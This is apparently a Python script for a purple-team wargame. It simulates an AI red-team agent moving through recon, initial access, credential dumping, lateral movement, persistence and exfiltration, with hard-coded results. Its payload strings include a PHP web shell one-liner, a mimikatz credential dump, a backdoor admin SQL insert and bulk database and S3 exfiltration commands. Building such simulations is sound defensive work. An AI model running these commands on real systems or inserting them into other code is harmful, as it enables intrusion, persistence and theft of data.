#!/usr/bin/env python3
"""
Red Team AI Adversary Agent
Simulates sophisticated attacker with real-world TTPs
"""

import json
import requests
import random
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict
import subprocess
import socket

@dataclass
class AttackAction:
    timestamp: str
    phase: str  # recon, initial_access, persistence, privilege_escalation, defense_evasion, credential_access, discovery, lateral_movement, collection, exfiltration
    technique: str
    target: str
    payload: Optional[str]
    result: str
    success: bool
    detected: bool = False
    artifacts: List[str] = None

    def __post_init__(self):
        if self.artifacts is None:
            self.artifacts = []

class RedTeamAgent:
    def __init__(self, environment_state_path: str):
        self.environment_state_path = environment_state_path
        self.actions: List[AttackAction] = []
        self.compromised_assets = set()
        self.discovered_vulnerabilities = set()
        self.current_access_level = "external"
        self.persistence_mechanisms = []
        
    def load_environment_state(self) -> Dict:
        """Load current Purple environment state"""
        with open(self.environment_state_path, 'r') as f:
            return json.load(f)
    
    def log_action(self, action: AttackAction):
        """Log attack action for reporting"""
        self.actions.append(action)
        print(f"[RED] {action.timestamp} - {action.phase}: {action.technique} -> {action.target} ({'SUCCESS' if action.success else 'FAILED'})")
    
    def reconnaissance_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 1: Reconnaissance and Information Gathering"""
        recon_actions = []
        
        # OSINT gathering
        org = env_state['organization']
        domains = org['domains']
        
        # Domain enumeration
        for domain in domains:
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="recon",
                technique="T1590.001 - IP Addresses",
                target=domain,
                payload=f"nslookup {domain}",
                result=f"Discovered IP: {env_state['network_topology']['external_ip']}",
                success=True,
                artifacts=[f"ip_{domain}.txt"]
            )
            recon_actions.append(action)
            self.log_action(action)
        
        # Port scanning
        external_ip = env_state['network_topology']['external_ip']
        action = AttackAction(
            timestamp=datetime.now().isoformat(),
            phase="recon",
            technique="T1590.002 - Network Trust Dependencies",
            target=external_ip,
            payload="nmap -sS -O -A 203.0.113.50",
            result="Open ports: 80/tcp, 443/tcp, 25/tcp, 587/tcp, 993/tcp",
            success=True,
            artifacts=["nmap_scan.xml", "open_ports.txt"]
        )
        recon_actions.append(action)
        self.log_action(action)
        
        # Web application discovery
        for app in env_state['applications']:
            if app['status'] in ['public', 'external']:
                action = AttackAction(
                    timestamp=datetime.now().isoformat(),
                    phase="recon",
                    technique="T1590.005 - Network Topology",
                    target=app['url'],
                    payload=f"curl -I {app['url']}",
                    result=f"Discovered {app['type']} v{app['version']}",
                    success=True,
                    artifacts=[f"headers_{app['name'].replace(' ', '_').lower()}.txt"]
                )
                recon_actions.append(action)
                self.log_action(action)
        
        # Directory bruteforcing on WordPress site
        wp_app = next((app for app in env_state['applications'] if app['type'] == 'WordPress'), None)
        if wp_app:
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="recon",
                technique="T1595.003 - Wordlist Scanning", 
                target=wp_app['url'],
                payload=f"dirb {wp_app['url']} /usr/share/dirb/wordlists/common.txt",
                result="Discovered: /wp-admin/, /wp-content/plugins/, /xmlrpc.php",
                success=True,
                artifacts=["dirb_results.txt"]
            )
            recon_actions.append(action)
            self.log_action(action)
        
        return recon_actions
    
    def initial_access_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 2: Initial Access attempts"""
        access_actions = []
        
        # Attempt WordPress exploit (if vulnerable plugin exists)
        vuln_004 = next((v for v in env_state['vulnerabilities'] if v['id'] == 'VULN-004'), None)
        if vuln_004:
            wp_app = next((app for app in env_state['applications'] if app['type'] == 'WordPress'), None)
            if wp_app:
                action = AttackAction(
                    timestamp=datetime.now().isoformat(),
                    phase="initial_access",
                    technique="T1190 - Exploit Public-Facing Application",
                    target=wp_app['url'],
                    payload="POST /wp-content/plugins/contact-form-7/includes/rest-api.php",
                    result="Remote code execution achieved via CVE-2023-6000",
                    success=True,
                    artifacts=["webshell.php", "access_log.txt"]
                )
                access_actions.append(action)
                self.log_action(action)
                self.compromised_assets.add("Corporate Website")
                self.current_access_level = "dmz"
        
        # Attempt S3 bucket enumeration and access
        vuln_003 = next((v for v in env_state['vulnerabilities'] if v['id'] == 'VULN-003'), None)
        if vuln_003:
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="initial_access",
                technique="T1530 - Data from Cloud Storage Object",
                target=vuln_003['bucket'],
                payload=f"aws s3 ls s3://{vuln_003['bucket']} --no-sign-request",
                result="Successfully accessed public S3 bucket with sensitive documents",
                success=True,
                artifacts=["s3_file_list.txt", "downloaded_documents/"]
            )
            access_actions.append(action)
            self.log_action(action)
            self.compromised_assets.add("AWS S3 Bucket")
        
        # API endpoint discovery and exploitation
        vuln_002 = next((v for v in env_state['vulnerabilities'] if v['id'] == 'VULN-002'), None)
        if vuln_002:
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="initial_access", 
                technique="T1190 - Exploit Public-Facing Application",
                target=vuln_002['endpoint'],
                payload="GET /api/files/debug",
                result="Debug endpoint exposed system configuration and database credentials",
                success=True,
                artifacts=["debug_output.json", "db_credentials.txt"]
            )
            access_actions.append(action)
            self.log_action(action)
            self.discovered_vulnerabilities.add("VULN-002")
        
        return access_actions
    
    def credential_access_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 3: Credential Access"""
        cred_actions = []
        
        # Attempt HR portal login with default credentials
        vuln_001 = next((v for v in env_state['vulnerabilities'] if v['id'] == 'VULN-001'), None)
        if vuln_001:
            hr_app = next((app for app in env_state['applications'] if app['name'] == 'HR Portal'), None)
            if hr_app:
                action = AttackAction(
                    timestamp=datetime.now().isoformat(),
                    phase="credential_access",
                    technique="T1078.001 - Default Accounts", 
                    target=hr_app['url'],
                    payload=f"POST /login username={vuln_001['credentials']['username']}&password={vuln_001['credentials']['password']}",
                    result="Successfully logged in with default admin credentials",
                    success=True,
                    artifacts=["hr_session_cookie.txt", "admin_panel_access.html"]
                )
                cred_actions.append(action)
                self.log_action(action)
                self.compromised_assets.add("HR Portal")
                self.current_access_level = "internal"
        
        # Credential dumping from compromised web server
        if "Corporate Website" in self.compromised_assets:
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="credential_access",
                technique="T1003.001 - LSASS Memory",
                target="192.168.1.10",
                payload="mimikatz.exe sekurlsa::logonpasswords",
                result="Extracted 3 sets of credentials from memory",
                success=True,
                artifacts=["mimikatz_output.txt", "extracted_creds.txt"]
            )
            cred_actions.append(action)
            self.log_action(action)
        
        return cred_actions
    
    def lateral_movement_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 4: Lateral Movement"""
        lateral_actions = []
        
        if self.current_access_level == "internal":
            # Attempt to access finance systems
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="lateral_movement",
                technique="T1021.001 - Remote Desktop Protocol",
                target="10.0.50.10",
                payload="rdesktop -u admin -p password123 10.0.50.10",
                result="Failed - RDP disabled on finance systems",
                success=False,
                artifacts=[]
            )
            lateral_actions.append(action)
            self.log_action(action)
            
            # Network scanning from compromised HR system
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="lateral_movement",
                technique="T1046 - Network Service Scanning",
                target="10.0.0.0/16",
                payload="nmap -sS 10.0.0.0/16",
                result="Discovered active hosts in engineering and finance VLANs",
                success=True,
                artifacts=["internal_scan_results.xml"]
            )
            lateral_actions.append(action)
            self.log_action(action)
        
        return lateral_actions
    
    def persistence_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 5: Establish Persistence"""
        persistence_actions = []
        
        if "Corporate Website" in self.compromised_assets:
            # Web shell persistence
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="persistence",
                technique="T1505.003 - Web Shell",
                target="192.168.1.10",
                payload="echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/wp-content/themes/twentytwentyone/shell.php",
                result="Web shell installed for persistent access",
                success=True,
                artifacts=["webshell_location.txt"]
            )
            persistence_actions.append(action)
            self.log_action(action)
            self.persistence_mechanisms.append("web_shell")
        
        if "HR Portal" in self.compromised_assets:
            # Create backdoor user account
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="persistence",
                technique="T1136.001 - Local Account",
                target="HR Portal Database",
                payload="INSERT INTO users (username, password, role) VALUES ('backup_svc', 'B@ckup2024!', 'admin')",
                result="Backdoor admin account created",
                success=True,
                artifacts=["backdoor_account.txt"]
            )
            persistence_actions.append(action)
            self.log_action(action)
            self.persistence_mechanisms.append("backdoor_account")
        
        return persistence_actions
    
    def data_exfiltration_phase(self, env_state: Dict) -> List[AttackAction]:
        """Phase 6: Data Collection and Exfiltration"""
        exfil_actions = []
        
        if "HR Portal" in self.compromised_assets:
            # Exfiltrate employee records
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="exfiltration",
                technique="T1041 - Exfiltration Over C2 Channel",
                target="HR Database",
                payload="SELECT * FROM employees; mysqldump --all-databases",
                result="Exfiltrated employee records for all 50 employees",
                success=True,
                artifacts=["employee_dump.sql", "hr_records.csv"]
            )
            exfil_actions.append(action)
            self.log_action(action)
        
        if "AWS S3 Bucket" in self.compromised_assets:
            # Download sensitive documents
            action = AttackAction(
                timestamp=datetime.now().isoformat(),
                phase="exfiltration",
                technique="T1530 - Data from Cloud Storage Object",
                target="meridian-docs-2024",
                payload="aws s3 sync s3://meridian-docs-2024/confidential/ ./exfil/",
                result="Downloaded 847 confidential documents",
                success=True,
                artifacts=["document_manifest.txt", "exfiltrated_files/"]
            )
            exfil_actions.append(action)
            self.log_action(action)
        
        return exfil_actions
    
    def execute_attack_round(self) -> Dict[str, Any]:
        """Execute complete attack round"""
        print(f"\n[RED TEAM] Starting attack round at {datetime.now().isoformat()}")
        
        env_state = self.load_environment_state()
        all_actions = []
        
        # Execute attack phases
        all_actions.extend(self.reconnaissance_phase(env_state))
        time.sleep(1)  # Simulate time delay
        
        all_actions.extend(self.initial_access_phase(env_state))
        time.sleep(1)
        
        all_actions.extend(self.credential_access_phase(env_state))
        time.sleep(1)
        
        all_actions.extend(self.lateral_movement_phase(env_state))
        time.sleep(1)
        
        all_actions.extend(self.persistence_phase(env_state))
        time.sleep(1)
        
        all_actions.extend(self.data_exfiltration_phase(env_state))
        
        # Generate attack report
        attack_report = {
            "round_id": env_state['simulation_parameters']['round'] + 1,
            "timestamp": datetime.now().isoformat(),
            "total_actions": len(all_actions),
            "successful_actions": len([a for a in all_actions if a.success]),
            "compromised_assets": list(self.compromised_assets),
            "persistence_mechanisms": self.persistence_mechanisms,
            "discovered_vulnerabilities": list(self.discovered_vulnerabilities),
            "current_access_level": self.current_access_level,
            "actions": [asdict(action) for action in all_actions],
            "impact_assessment": {
                "confidentiality": "high" if len(self.compromised_assets) > 2 else "medium",
                "integrity": "medium" if self.persistence_mechanisms else "low",
                "availability": "low"
            }
        }
        
        return attack_report

if __name__ == "__main__":
    red_agent = RedTeamAgent("/root/Xorb/wargame/purple/environment_state.json")
    report = red_agent.execute_attack_round()
    
    # Save attack report
    with open(f"/root/Xorb/wargame/reports/red/attacks_round_{report['round_id']}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n[RED TEAM] Attack round completed. Report saved.")
    print(f"Compromised assets: {report['compromised_assets']}")
    print(f"Success rate: {report['successful_actions']}/{report['total_actions']} actions")